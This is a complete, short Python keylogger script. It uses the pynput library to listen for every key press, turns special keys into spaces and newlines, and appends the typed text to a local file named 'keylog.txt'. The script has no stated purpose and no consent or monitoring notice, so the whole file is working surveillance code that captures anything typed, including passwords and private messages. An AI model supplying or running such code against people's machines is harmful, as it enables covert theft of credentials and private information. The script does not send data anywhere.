from pynput.keyboard import Listener

# Path to save the log file
log_file = "keylog.txt"

# Function to log keystrokes
def log_key(key):
    key = str(key).replace("'", "")  # Clean up the key format
    if key == 'Key.space':
        key = ' '  # Replace 'space' with an actual space
    elif key == 'Key.enter':
        key = '\n'  # Replace 'enter' with a new line
    elif key.startswith('Key'):
        key = ''  # Ignore special keys (like shift, ctrl, etc.)
    
    with open(log_file, "a") as f:
        f.write(key)

# Setting up the key listener
with Listener(on_press=log_key) as listener:
    listener.join()
